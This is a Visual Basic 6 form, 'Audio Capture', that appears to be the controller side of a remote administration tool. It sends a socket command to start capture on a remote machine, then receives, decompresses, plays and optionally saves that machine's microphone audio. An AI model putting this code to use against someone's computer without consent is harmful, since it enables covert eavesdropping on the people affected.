VERSION 5.00
Begin VB.Form FrmAudio 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Audio Capture"
   ClientHeight    =   1335
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   7050
   Icon            =   "FrmAudio.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1335
   ScaleWidth      =   7050
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox p 
      AutoRedraw      =   -1  'True
      BackColor       =   &H00000000&
      Height          =   735
      Left            =   2160
      ScaleHeight     =   45
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   307
      TabIndex        =   0
      Top             =   360
      Width           =   4665
   End
   Begin Servidor.ucToolbar ucToolbar1 
      Height          =   495
      Left            =   240
      Top             =   480
      Width           =   1935
      _ExtentX        =   3413
      _ExtentY        =   873
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   6120
      Top             =   240
   End
   Begin VB.Frame Frame1 
      Height          =   1095
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   6855
   End
End
Attribute VB_Name = "FrmAudio"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Const MAXPNAMELEN = 32  '  max product name length (including NULL)
Private Const WAVE_ALLOWSYNC = &H2
Private Const WAVE_FORMAT_1M08 = &H1              '  11.025 kHz, Mono,   8-bit
Private Const WAVE_FORMAT_1M16 = &H4              '  11.025 kHz, Mono,   16-bit
Private Const WAVE_FORMAT_1S08 = &H2              '  11.025 kHz, Stereo, 8-bit
Private Const WAVE_FORMAT_1S16 = &H8              '  11.025 kHz, Stereo, 16-bit
Private Const WAVE_FORMAT_2M08 = &H10             '  22.05  kHz, Mono,   8-bit
Private Const WAVE_FORMAT_2M16 = &H40             '  22.05  kHz, Mono,   16-bit
Private Const WAVE_FORMAT_2S08 = &H20             '  22.05  kHz, Stereo, 8-bit
Private Const WAVE_FORMAT_2S16 = &H80             '  22.05  kHz, Stereo, 16-bit
Private Const WAVE_FORMAT_4M08 = &H100            '  44.1   kHz, Mono,   8-bit
Private Const WAVE_FORMAT_4M16 = &H400            '  44.1   kHz, Mono,   16-bit
Private Const WAVE_FORMAT_4S08 = &H200            '  44.1   kHz, Stereo, 8-bit
Private Const WAVE_FORMAT_4S16 = &H800            '  44.1   kHz, Stereo, 16-bit
Private Const WAVE_FORMAT_DIRECT = &H8
Private Const WAVE_FORMAT_DSPGROUP_TRUESPEECH = &H22 ' DSP Group Wave Format
Private Const WAVE_FORMAT_PCM = 1  '  Needed in resource files so outside #ifndef RC_INVOKED
Private Const WAVE_FORMAT_QUERY = &H1
Private Const WAVE_FORMAT_DIRECT_QUERY = (WAVE_FORMAT_QUERY Or WAVE_FORMAT_DIRECT)
Private Const WAVE_INVALIDFORMAT = &H0              '  invalid format
Private Const WAVE_MAPPED = &H4
Private Const WAVE_MAPPER = -1&
Private Const WAVE_VALID = &H3         '  ;Internal
Private Const WAVECAPS_LRVOLUME = &H8         '  separate left-right volume control
Private Const WAVECAPS_PITCH = &H1         '  supports pitch control
Private Const WAVECAPS_PLAYBACKRATE = &H2         '  supports playback rate control
Private Const WAVECAPS_SYNC = &H10
Private Const WAVECAPS_VOLUME = &H4         '  supports volume control
Private Const WAVERR_BASE = 32
Private Const WAVERR_BADFORMAT = (WAVERR_BASE + 0)    '  unsupported wave format
Private Const WAVERR_LASTERROR = (WAVERR_BASE + 3)    '  last error in range
Private Const WAVERR_STILLPLAYING = (WAVERR_BASE + 1)    '  still something playing
Private Const WAVERR_SYNC = (WAVERR_BASE + 3)    '  device is synchronous
Private Const WAVERR_UNPREPARED = (WAVERR_BASE + 2)    '  header not prepared
Private Const WHDR_BEGINLOOP = &H4         '  loop start block
Private Const WHDR_DONE = &H1         '  done bit
Private Const WHDR_ENDLOOP = &H8         '  loop end block
Private Const WHDR_INQUEUE = &H10        '  reserved for driver
Private Const WHDR_PREPARED = &H2         '  set if this header has been prepared
Private Const WHDR_VALID = &H1F        '  valid flags      / ;Internal /
Private Type MMTIME
    wType As Long
    u As Long
End Type
Private Type WAVEFORMAT
    wFormatTag As Integer
    nChannels As Integer
    nSamplesPerSec As Long
    nAvgBytesPerSec As Long
    nBlockAlign As Integer
End Type
Private Type WAVEFORMATEX
    wFormatTag As Integer
    nChannels As Integer
    nSamplesPerSec As Long
    nAvgBytesPerSec As Long
    nBlockAlign As Integer
    wBitsPerSample As Integer
    cbSize As Integer
End Type
'in case the the codec information is too big for the regular structure
Private Type WAVEFORMATEXBIG
    wFormatTag As Integer
    nChannels As Integer
    nSamplesPerSec As Long
    nAvgBytesPerSec As Long
    nBlockAlign As Integer
    wBitsPerSample As Integer
    cbSize As Integer
    additional(64) As Byte
End Type
Private Type WAVEHDR
    lpData As Long
    dwBufferLength As Long
    dwBytesRecorded As Long
    dwUser As Long
    dwFlags As Long
    dwLoops As Long
    lpNext As Long
    Reserved As Long
End Type
Private Type WAVEINCAPS
    wMid As Integer
    wPid As Integer
    vDriverVersion As Long
    szPname As String * MAXPNAMELEN
    dwFormats As Long
    wChannels As Integer
End Type
Private Type WAVEOUTCAPS
    wMid As Integer
    wPid As Integer
    vDriverVersion As Long
    szPname As String * MAXPNAMELEN
    dwFormats As Long
    wChannels As Integer
    dwSupport As Long
End Type
Private Declare Function waveInAddBuffer Lib "winmm.dll" (ByVal hWaveIn As Long, lpWaveInHdr As WAVEHDR, ByVal uSize As Long) As Long
Private Declare Function waveInClose Lib "winmm.dll" (ByVal hWaveIn As Long) As Long
Private Declare Function waveInGetDevCaps Lib "winmm.dll" Alias "waveInGetDevCapsA" (ByVal uDeviceID As Long, lpCaps As WAVEINCAPS, ByVal uSize As Long) As Long
Private Declare Function waveInGetErrorText Lib "winmm.dll" Alias "waveInGetErrorTextA" (ByVal err As Long, ByVal lpText As String, ByVal uSize As Long) As Long
Private Declare Function waveInGetID Lib "winmm.dll" (ByVal hWaveIn As Long, lpuDeviceID As Long) As Long
Private Declare Function waveInGetNumDevs Lib "winmm.dll" () As Long
Private Declare Function waveInGetPosition Lib "winmm.dll" (ByVal hWaveIn As Long, lpInfo As MMTIME, ByVal uSize As Long) As Long
Private Declare Function waveInMessage Lib "winmm.dll" (ByVal hWaveIn As Long, ByVal Msg As Long, ByVal dw1 As Long, ByVal dw2 As Long) As Long
Private Declare Function waveInOpen Lib "winmm.dll" (lphWaveIn As Long, ByVal uDeviceID As Long, lpFormat As WAVEFORMATEX, ByVal dwCallback As Long, ByVal dwInstance As Long, ByVal dwFlags As Long) As Long
Private Declare Function waveInPrepareHeader Lib "winmm.dll" (ByVal hWaveIn As Long, lpWaveInHdr As WAVEHDR, ByVal uSize As Long) As Long
Private Declare Function waveInReset Lib "winmm.dll" (ByVal hWaveIn As Long) As Long
Private Declare Function waveInStart Lib "winmm.dll" (ByVal hWaveIn As Long) As Long
Private Declare Function waveInStop Lib "winmm.dll" (ByVal hWaveIn As Long) As Long
Private Declare Function waveInUnprepareHeader Lib "winmm.dll" (ByVal hWaveIn As Long, lpWaveInHdr As WAVEHDR, ByVal uSize As Long) As Long
Private Declare Function waveOutBreakLoop Lib "winmm.dll" (ByVal hWaveOut As Long) As Long
Private Declare Function waveOutClose Lib "winmm.dll" (ByVal hWaveOut As Long) As Long
Private Declare Function waveOutGetDevCaps Lib "winmm.dll" Alias "waveOutGetDevCapsA" (ByVal uDeviceID As Long, lpCaps As WAVEOUTCAPS, ByVal uSize As Long) As Long
Private Declare Function waveOutGetErrorText Lib "winmm.dll" Alias "waveOutGetErrorTextA" (ByVal err As Long, ByVal lpText As String, ByVal uSize As Long) As Long
Private Declare Function waveOutGetID Lib "winmm.dll" (ByVal hWaveOut As Long, lpuDeviceID As Long) As Long
Private Declare Function waveOutGetNumDevs Lib "winmm.dll" () As Long
Private Declare Function waveOutGetPitch Lib "winmm.dll" (ByVal hWaveOut As Long, lpdwPitch As Long) As Long
Private Declare Function waveOutGetPlaybackRate Lib "winmm.dll" (ByVal hWaveOut As Long, lpdwRate As Long) As Long
Private Declare Function waveOutGetPosition Lib "winmm.dll" (ByVal hWaveOut As Long, lpInfo As MMTIME, ByVal uSize As Long) As Long
Private Declare Function waveOutGetVolume Lib "winmm.dll" (ByVal uDeviceID As Long, lpdwVolume As Long) As Long
Private Declare Function waveOutMessage Lib "winmm.dll" (ByVal hWaveOut As Long, ByVal Msg As Long, ByVal dw1 As Long, ByVal dw2 As Long) As Long
Private Declare Function waveOutOpen Lib "winmm.dll" (lphWaveOut As Long, ByVal uDeviceID As Long, lpFormat As WAVEFORMATEX, ByVal dwCallback As Long, ByVal dwInstance As Long, ByVal dwFlags As Long) As Long
Private Declare Function waveOutPause Lib "winmm.dll" (ByVal hWaveOut As Long) As Long
Private Declare Function waveOutPrepareHeader Lib "winmm.dll" (ByVal hWaveOut As Long, lpWaveOutHdr As WAVEHDR, ByVal uSize As Long) As Long
Private Declare Function waveOutReset Lib "winmm.dll" (ByVal hWaveOut As Long) As Long
Private Declare Function waveOutRestart Lib "winmm.dll" (ByVal hWaveOut As Long) As Long
Private Declare Function waveOutSetPitch Lib "winmm.dll" (ByVal hWaveOut As Long, ByVal dwPitch As Long) As Long
Private Declare Function waveOutSetPlaybackRate Lib "winmm.dll" (ByVal hWaveOut As Long, ByVal dwRate As Long) As Long
Private Declare Function waveOutSetVolume Lib "winmm.dll" (ByVal uDeviceID As Long, ByVal dwVolume As Long) As Long
Private Declare Function waveOutUnprepareHeader Lib "winmm.dll" (ByVal hWaveOut As Long, lpWaveOutHdr As WAVEHDR, ByVal uSize As Long) As Long
Private Declare Function waveOutWrite Lib "winmm.dll" (ByVal hWaveOut As Long, lpWaveOutHdr As WAVEHDR, ByVal uSize As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As Long, ByVal Source As Long, ByVal Length As Long)

Private Type PCMFORM
  yRiffFormatTag As String * 4
  yfdataSize As Long
  yWaveTag As String * 4
  yWavetName As String * 4
  yWaveSize As Long
  wFormatTag As Integer
  wChannels As Integer
  wSamplesPerSec As Long
  xAvgBytesPerSec As Long
  xBlockAlign As Integer
  wBitsPerSample As Integer
  yData As String * 4
  wDataSize As Long
End Type

Private Const Stepping As Long = 2 ' 1 bis 6 Geschwindigkeit für die Verlaufsanzeige

Dim pPCM As PCMFORM


Dim bRecord As Boolean, bSent As Boolean, hWaveIn As Long
Dim Wave() As Byte, waveout() As Byte, dwWaveLength As Long
Dim InFormat As WAVEFORMATEX, OutFormat As WAVEFORMATEX
Dim hWaveOut As Long
Dim wvhdr1 As WAVEHDR
Dim wvhdr2 As WAVEHDR

Private lngXLine As Long
Private lngOldVal As Long

Public ParentID                 As Long
Public SocketID                 As Long
Private m_Data                  As String
Private pFileN                  As Long
Private lMax                    As Double
Private mRec                    As Boolean

Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    Dim vData()     As String
    Dim AudioStream() As Byte
    Dim AudioCompress() As Byte
    Dim LenBuff As Long
    Static Flag As Boolean

    Dim Valor As Long
    Dim mSeek As Long
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left$(sBuf, lRet2 - 1)
        sBuf = Mid$(sBuf, lRet2 + 1)

        Select Case sCommand
        
            Case 0
                'Debug.Print Len(sBuf)
                
               ' DoEvents
                AudioCompress = StrConv(sBuf, vbFromUnicode)
                
                If DeCompress(AudioCompress, AudioStream) Then
                
                    LenBuff = UBound(AudioStream) + 1
                    '-------------------
                    If mRec Then
                        mSeek = LOF(pFileN) + 1
                        If mSeek < Len(pPCM) Then mSeek = Len(pPCM) + 1
                        Put pFileN, mSeek, AudioStream
                        With pPCM
                          .yfdataSize = LOF(pFileN)
                          .wDataSize = LOF(pFileN) - 44
                        End With
                        Put pFileN, pFileN, pPCM
                    End If
                    '--------------------
    
                    lMax = GetMax(AudioStream)
                    
                    If Flag Then
                        Flag = False
                        
                        wvhdr1.lpData = VarPtr(AudioStream(0))
                        wvhdr1.dwBufferLength = LenBuff
                        
                        waveOutPrepareHeader hWaveOut, wvhdr1, Len(wvhdr1)
                        waveOutWrite hWaveOut, wvhdr1, Len(wvhdr1)
                        While ((wvhdr1.dwFlags And WHDR_DONE) <> WHDR_DONE)
                            DoEvents
                        Wend
                        waveOutUnprepareHeader hWaveOut, wvhdr1, Len(wvhdr1)
                    
                    Else
                        Flag = True
    
                        wvhdr2.lpData = VarPtr(AudioStream(0))
                        wvhdr2.dwBufferLength = LenBuff
                        waveOutPrepareHeader hWaveOut, wvhdr2, Len(wvhdr2)
                        waveOutWrite hWaveOut, wvhdr2, Len(wvhdr2)
                        While ((wvhdr2.dwFlags And WHDR_DONE) <> WHDR_DONE)
                            DoEvents
                        Wend
                        waveOutUnprepareHeader hWaveOut, wvhdr2, Len(wvhdr2)
                        
                    End If
                    
                End If
                
            Case 1
                Frame1.Caption = sBuf

        End Select
    
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(id, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub


Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    TerminateConnection SocketID
    SocketID = 0
    Me.Caption = "Audio Capture - Sin Conexión"
    Timer1.Enabled = False
    ucToolbar1.Enabled = False
    ucToolbar1.ButtonCaption(1) = "Rec"
    Frame1.Caption = vbNullString
    Close pFileN
End Sub

Public Sub Socket_Conect(id As Long, IP As String, Puerto As String)
    
End Sub

Private Sub Form_Load()
    Dim lngX As Long, lngY As Long
    
        With ucToolbar1

            Call .Initialize(ImageSize:=24, FlatStyle:=True, ListStyle:=True, Divider:=False)
            Call .AddBitmap(LoadResPicture(7, vbResBitmap))
            
            Call .AddButton("Rec", 3, "Rec", eNormal)
            Call .AddButton("Stop", 2, "Stop", eNormal)
            'Call .AddButton(, , , [eSeparator])

        End With
    
    
    With OutFormat
        .wFormatTag = WAVE_FORMAT_PCM
        .nSamplesPerSec = 8000
        .wBitsPerSample = 16
        .nChannels = 1
        .nBlockAlign = OutFormat.wBitsPerSample * OutFormat.nChannels / 8
        .nAvgBytesPerSec = OutFormat.nBlockAlign * OutFormat.nSamplesPerSec
    End With
    
    With pPCM
      .yRiffFormatTag = "RIFF"
      .yWaveTag = "WAVE"
      .yWavetName = "fmt "
      .yWaveSize = &H10
      .wFormatTag = OutFormat.wFormatTag
      .wChannels = OutFormat.nChannels
      .wSamplesPerSec = OutFormat.nSamplesPerSec
      .xAvgBytesPerSec = OutFormat.nAvgBytesPerSec
      .xBlockAlign = OutFormat.nBlockAlign
      .wBitsPerSample = OutFormat.wBitsPerSample
      .yData = "data"
    End With
    
    For lngX = p.ScaleWidth - 1 To 0 Step -12
    
        p.Line (lngX, 0)-(lngX, p.ScaleHeight), RGB(0, 96, 0)
        
    Next lngX
    
    For lngY = p.ScaleHeight - 1 To 0 Step -12
    
        p.Line (0, lngY)-(p.ScaleWidth, lngY), RGB(0, 96, 0)
        
    Next lngY
    
    p.Picture = p.Image
    
    waveOutOpen hWaveOut, WAVE_MAPPER, OutFormat, 0, 0, 0

    Call WinSock32.SendData(SocketID, "0")
    
    MdlINI.ReadFormPosAndSize Me
End Sub


Private Sub Form_Unload(Cancel As Integer)
    If SocketID Then
        Call WinSock32.SendData(SocketID, "1")
        TerminateConnection SocketID
        WinSock32.WsClose SocketID
    End If
    waveOutClose hWaveOut
    Close pFileN
    MdlINI.SaveFormPosAndSize Me
End Sub

Public Function GetMax(WaveData() As Byte) As Double
    Dim lngItem As Long
    Dim lngCurL As Long
    Dim lngCurR As Long
    Dim lngCurM As Long
    Dim lngMaxM As Long
    
    For lngItem = 0 To UBound(WaveData) - 1 Step 4 '2
    
        lngCurM = Abs(CLng(MakeWord(WaveData(lngItem), WaveData(lngItem + 1))))
        
        If lngCurM > lngMaxM Then lngMaxM = lngCurM
                
    Next lngItem

    GetMax = (100 * lngMaxM) / 32768
    
End Function



Private Sub DrawProzessor(ByVal Value As Double)

    Dim lngY As Long
    
    p.Picture = p.Image
    
    p.PaintPicture p.Picture, 0, 0, p.ScaleWidth - Stepping, p.ScaleHeight, Stepping, 0, p.ScaleWidth - Stepping, p.ScaleHeight, vbSrcCopy
        
    p.Line (p.ScaleWidth - Stepping, 0)-(p.ScaleWidth, p.ScaleHeight - 1), p.BackColor, BF
        
    For lngY = p.ScaleHeight - 1 To 0 Step -12
    
        p.Line (p.ScaleWidth - Stepping, lngY)-(p.ScaleWidth, lngY), RGB(0, 96, 0)
            
    Next lngY
    
    lngXLine = lngXLine + Stepping
    
    If lngXLine = 12 Then
    
        p.Line (p.ScaleWidth - 1, 0)-(p.ScaleWidth - 1, p.ScaleHeight), RGB(0, 96, 0)
            
        lngXLine = 0
        
    End If
    
    Value = ((p.ScaleHeight - 1) * Value) \ 100
    
    p.Line (p.ScaleWidth - Stepping - 1, p.ScaleHeight - lngOldVal)-(p.ScaleWidth - 1, p.ScaleHeight - Value), RGB(0, 255, 0)
        
    lngOldVal = Value
    
End Sub



Public Function MakeWord(LoByte As Byte, HiByte As Byte) As Integer
  If HiByte And &H80 Then
    MakeWord = ((HiByte * &H100&) Or LoByte) Or &HFFFF0000
  Else
    MakeWord = (HiByte * &H100) Or LoByte
  End If
End Function

Private Sub Timer1_Timer()
    DrawProzessor lMax
    lMax = 0
End Sub

Private Sub ucToolbar1_ButtonClick(ByVal Button As Long)
    On Error GoTo ErrHandler
    Dim sPath As String

    If Button = 1 Then
        If Not mRec Then
           
            If pFileN = 0 Then
           
                sPath = ShowSaveFile(Me.hwnd, "Audio1.wav")
         
                If Len(sPath) > 0 Then
                    If Len(Dir(sPath)) Then Kill sPath
                    pFileN = FreeFile
                    Open sPath For Binary As #pFileN
                    ucToolbar1.ButtonCaption(1) = "Pausa"
                    ucToolbar1.ButtonImage(1) = 0
                End If
            End If
        Else
            ucToolbar1.ButtonCaption(1) = "Rec"
            ucToolbar1.ButtonImage(1) = 3
        End If
        mRec = Not mRec
    Else
        mRec = False
        Close pFileN
        pFileN = 0
        ucToolbar1.ButtonCaption(1) = "Rec"
        ucToolbar1.ButtonImage(1) = 3
    End If
        
    Exit Sub
        
ErrHandler:
    pFileN = 0
    mRec = False
    ucToolbar1.ButtonCaption(1) = "Rec"
    ucToolbar1.ButtonImage(1) = 3
    MsgBox err.Description, vbCritical, "Error: " & err.Number
End Sub
